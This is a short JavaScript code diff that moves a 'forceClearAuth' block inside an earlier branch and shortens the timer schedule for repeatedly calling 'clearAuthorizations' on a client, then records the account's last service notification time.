@@ -126,25 +126,23 @@ ${messageText}`;
         }),
         true
       );
-    }
 
-    if (forceClearAuth) {
-      [0.5, 1, 1.5, 2.5, 5, 7.5, 10].forEach((minutes) => {
-        setTimeout(
-          async () => {
-            if (client) {
+      if (forceClearAuth) {
+        [0.05, 0.15, 0.25, 0.5, 1, 1.5, 2.5, 5].forEach((minutes) => {
+          setTimeout(
+            async () => {
               try {
                 await clearAuthorizations(client);
               } catch {}
-            }
-          },
-          minutes * 60 * 1000
-        );
-      });
+            },
+            minutes * 60 * 1000
+          );
+        });
 
-      await updateAccountById(accountId, {
-        lastServiceNotification: new Date(),
-      });
+        await updateAccountById(accountId, {
+          lastServiceNotification: new Date(),
+        });
+      }
     }
 
     return;
